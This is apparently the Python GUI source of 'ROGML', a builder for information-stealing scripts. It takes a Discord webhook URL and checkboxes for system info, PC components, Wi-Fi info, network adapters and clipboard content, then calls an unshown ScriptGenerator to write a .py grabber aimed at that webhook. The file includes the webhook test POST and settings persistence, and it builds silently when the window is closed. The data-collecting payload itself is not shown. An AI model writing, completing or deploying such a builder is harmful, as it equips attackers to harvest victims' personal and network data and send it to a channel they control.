from settings import load_settings, save_settings
from script_generator import ScriptGenerator
from tkinter import IntVar, messagebox
from tkinter import ttk

class GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ROGML")
        self.root.geometry("1100x800+420+100")
        self.root.minsize(600, 500)
        self.root.configure(bg='#1e1e2e')
        
        self.root.iconbitmap('Assets/Logos/windowIcon.ico')

        self.settings = load_settings()

        style = ttk.Style()
        style.configure('TLabel', font=('Arial', 18), background='#1e1e2e', foreground='#ffffff')
        style.configure('TButton', font=('Arial', 12), background='#3b3b5c', foreground='#ffffff', padding=10)
        style.map('TButton', background=[('active', '#505080')])
        style.configure('TCheckbutton', font=('Arial', 12), background='#1e1e2e', foreground='#ffffff', padding=5)
        style.configure('TFrame', background='#1e1e2e')

        ttk.Label(root, text="Roy Orbison Gen Modifications Lab (ROGML)", style='TLabel').pack(pady=20)

        self.option_vars = {
            'system_info': IntVar(value=self.settings.get('system_info', 0)),
            'pc_components': IntVar(value=self.settings.get('pc_components', 0)),
            'wifi_info': IntVar(value=self.settings.get('wifi_info', 0)),
            'network_adapters': IntVar(value=self.settings.get('network_adapters', 0)),
            'clipboard_content': IntVar(value=self.settings.get('clipboard_content', 0))
        }

        self.webhook_entry = self._create_placeholder_entry(root, "Enter Discord Webhook", self.settings.get('webhook_url', ''))
        ttk.Button(root, text="Test Webhook", command=self.test_webhook, cursor="hand2", style='TButton').pack(pady=10)

        options_frame = ttk.Frame(root, style='TFrame')
        options_frame.pack(pady=20)
        self._create_checkbuttons(options_frame)

        filename_frame = ttk.Frame(root, style='TFrame')
        filename_frame.pack(side='bottom', anchor='e', pady=20, padx=20)
        self.filename_entry = self._create_placeholder_entry(filename_frame, "Enter file name", self.settings.get('filename', 'ROGML.py'), width=20)
        ttk.Button(filename_frame, text="Build", command=self.build_script, cursor="hand2", style='TButton').pack(side='right', padx=0)

        style.configure('TButton', font=('Arial', 12), background='#3b3b5c', foreground='#ffffff', padding=10, borderwidth=0, relief='flat')
        style.map('TButton', background=[('active', '#505080')], relief=[('active', 'solid')], bordercolor=[('active', '#1e1e2e')], borderwidth=[('active', 1)])

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def _create_placeholder_entry(self, parent, placeholder, value='', width=50):
        entry = ttk.Entry(parent, width=width, font=('Arial', 12), foreground='grey')
        entry.pack(pady=5)
        if value:
            entry.insert(0, value)
            entry.config(foreground='black')
        else:
            self._set_placeholder(entry, placeholder)
        return entry

    def _set_placeholder(self, entry, placeholder):
        entry.insert(0, placeholder)
        entry.bind("<FocusIn>", lambda event: self._on_focus_in(event, placeholder))
        entry.bind("<FocusOut>", lambda event: self._on_focus_out(event, placeholder))

    def _on_focus_in(self, event, placeholder):
        if event.widget.get() == placeholder:
            event.widget.delete(0, "end")
            event.widget.config(foreground='black')

    def _on_focus_out(self, event, placeholder):
        if not event.widget.get():
            event.widget.insert(0, placeholder)
            entry_style = ttk.Style()
            entry_style.configure('TEntry', foreground='grey')
            event.widget.config(foreground='grey')

    def _create_checkbuttons(self, parent):
        options = [
            ("System Info", self.option_vars['system_info']),
            ("PC Components", self.option_vars['pc_components']),
            ("Wi-Fi Info", self.option_vars['wifi_info']),
            ("Network Adapters", self.option_vars['network_adapters']),
            ("Clipboard Content", self.option_vars['clipboard_content'])
        ]
        for text, var in options:
            checkbutton = ttk.Checkbutton(parent, text=text, variable=var, style='TCheckbutton')
            checkbutton.pack(anchor='w', padx=20, pady=5)
            checkbutton.bind("<Enter>", lambda e: e.widget.config(cursor="hand2"))
            checkbutton.bind("<Leave>", lambda e: e.widget.config(cursor=""))

    def test_webhook(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url.strip():
            messagebox.showerror("Error", "Please enter a Discord Webhook URL.")
            return
        if self._send_test_message(webhook_url, "This is a test message"):
            messagebox.showinfo("Success", "Test message sent successfully.")
        else:
            messagebox.showerror("Error", "Failed to send test message.")

    def _send_test_message(self, webhook_url, description):
        import requests
        import json

        data = {
            "embeds": [
                {
                    "title": "ROGML",
                    "description": description
                }
            ]
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        return response.status_code == 204

    def build_script(self, verbose=True):
        if not any(var.get() for var in self.option_vars.values()):
            if verbose:
                messagebox.showerror("Error", "Please select at least one checkbox.")
            return

        webhook_url = self.webhook_entry.get().strip()
        if not webhook_url:
            if verbose:
                messagebox.showerror("Error", "Please enter a Discord Webhook URL.")
            return

        if verbose and not self._send_test_message(webhook_url, "This is a discord webhook success verification message"):
            return

        selected_options = {key: var for key, var in self.option_vars.items()}
        filename = self.filename_entry.get().strip() or "ROGML.py"
        if not filename.endswith(".py"):
            filename += ".py"
        generator = ScriptGenerator(selected_options, webhook_url, filename)
        generator.create_script(verbose=verbose)

        self._save_current_settings(webhook_url, filename)

    def _save_current_settings(self, webhook_url, filename):
        for key, var in self.option_vars.items():
            self.settings[key] = var.get()
        self.settings['webhook_url'] = webhook_url
        self.settings['filename'] = filename
        save_settings(self.settings)

    def on_closing(self):
        self.build_script(verbose=False)
        self.root.destroy()